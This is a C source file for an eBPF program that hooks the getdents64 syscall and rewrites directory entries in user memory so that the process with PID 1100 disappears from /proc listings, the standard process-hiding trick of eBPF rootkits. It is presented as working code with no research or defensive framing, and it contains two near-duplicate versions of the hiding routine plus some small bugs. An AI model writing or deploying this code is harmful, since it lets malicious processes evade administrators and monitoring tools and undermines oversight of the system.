#include <vmlinux.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

#define MAX_PID_LEN 250
#define MAX_DIRENTS 10000
#define MAX_NAME_LEN 100


struct
{
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, u32);
    __type(value, u64);
} map_buffs SEC(".maps");

struct
{
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, int);
} map_bytes_read SEC(".maps");


struct dirents_data_t {
    u32 bpos;
    u64* dirent_buf;
    long buff_size;
    u16 d_reclen;
    u16 d_reclen_prev;
    bool patch_succeded;
};

static __always_inline
struct linux_dirent64 * get_dirent(u64 dirents_buf, int bpos) {
   return (struct linux_dirent64 *)(dirents_buf + bpos);
}

static __always_inline
int read_user__reclen(u16 * dst, unsigned short * raw_data) {
   return bpf_probe_read(dst, sizeof(*dst), raw_data);
}

static __always_inline
int read_user__dirname(u8 * dst, char * raw_data) {
   return bpf_probe_read_user_str(dst, sizeof(dst), raw_data);
}

static __always_inline
bool is_dirname_to_hide(int max_str_len, u8 * dirname, u8 * dirname_to_hide) {
   int i = 0;
   for (; i < max_str_len; i++) {
      if (dirname[i] != dirname_to_hide[i]) return false;
   }
   return dirname[i] == 0x00;
}

static __always_inline
bool remove_curr_dirent(struct dirents_data_t * data) {
   struct linux_dirent64 *dirent_previous = get_dirent(*data->dirent_buf, (data->bpos - data->d_reclen_prev));
   u16 d_reclen_new = data->d_reclen + data->d_reclen_prev;
   return bpf_probe_write_user(&dirent_previous->d_reclen, &d_reclen_new, sizeof(d_reclen_new)) == 0;
}


static __always_inline int patch_dirents_if_found(u32 index, struct dirents_data_t *data){
    if(data->bpos > data->buff_size){
        return 1;
    }
    u8 dirname[MAX_NAME_LEN];
    struct linux_dirent64* dirent = get_dirent(*data->dirent_buf, data->bpos);

    read_user__reclen(&data->d_reclen, &dirent->d_reclen);
    read_user__dirname(dirname, dirent->d_name);

    char pid_to_hide[] = "1100";
    int pid_to_hide_len = sizeof(pid_to_hide);


    if(is_dirname_to_hide(pid_to_hide_len, dirname, (u8*)pid_to_hide)){
        bpf_printk("find pid, dirname: %s",dirname);
        data->patch_succeded = remove_curr_dirent(data);
        return 1;
    }
    data->d_reclen_prev = data->d_reclen;
    data->bpos += data->d_reclen;
    return 0;
}


static __always_inline int is_dirname_to_hide2(int len, char* dirname, char* pid_to_hide){
    int i = 0 ;
    for(;i < len;i++){
        if(dirname[i] != pid_to_hide[i]){
            return false;
        }
    }
    return dirname[i] == 0x00;
}

static __always_inline int patch_dirents_if_found2(u32 index, struct dirents_data_t *data){
    if(data->bpos > data->buff_size){
        return 1;
    }
    char dirname[MAX_NAME_LEN];
    struct linux_dirent64* dirp = (struct linux_dirent64*)(*data->dirent_buf + data->bpos);
    bpf_probe_read(&data->d_reclen, sizeof(data->d_reclen), &dirp->d_reclen);
    bpf_probe_read_user_str(dirname, sizeof(dirname), dirp->d_name);
    char pid_to_hide[] = "1100";
    int pid_to_hide_len = sizeof(pid_to_hide);
    if(is_dirname_to_hide2(pid_to_hide_len, dirname, pid_to_hide)){
        bpf_printk("find pid, dirname: %s",dirname);
        struct linux_dirent64* dirp_prev = (struct linux_dirent64*)(*data->dirent_buf + data->bpos - data->d_reclen_prev);
        u16  d_reclen_new = data->d_reclen + data->d_reclen_prev;
        long ret = bpf_probe_write_user(&dirp_prev->d_reclen, &d_reclen_new, sizeof(d_reclen_new));
        data->patch_succeded = ret;
        return 1;
    }
    data->d_reclen_prev = data->d_reclen;
    data->bpos += data->d_reclen;
    return 0;
}

SEC("tp/syscalls/sys_enter_getdents64")
int handle_getdents_enter(struct trace_event_raw_sys_enter* ctx){
    u64 dirp = ctx->args[1];
    u32 pid_tgid = bpf_get_current_pid_tgid() >> 32;
    bpf_map_update_elem(&map_buffs, &pid_tgid, &dirp, BPF_ANY);

    return 0;
}

SEC("tp/syscalls/sys_exit_getdents64")
int handle_getdents_exit2(struct trace_event_raw_sys_exit* ctx){
    u64 pid = bpf_get_current_pid_tgid() >> 32;
    u64* dirent_buf = (u64*)bpf_map_lookup_elem(&map_buffs, &pid);

    if (!dirent_buf){
        return 0;
    }
    struct dirents_data_t dirents_data = {
        .bpos = 0,
        .dirent_buf = dirent_buf,
        .buff_size = ctx->ret,
        .d_reclen = 0,
        .d_reclen_prev = 0,
        .patch_succeded = false
    };

    bpf_loop(MAX_DIRENTS,patch_dirents_if_found2 ,&dirents_data, 0 );
    bpf_map_delete_elem(&map_buffs, &pid);

    return 0;
}



char LICENSE[] SEC("license") = "Dual BSD/GPL";
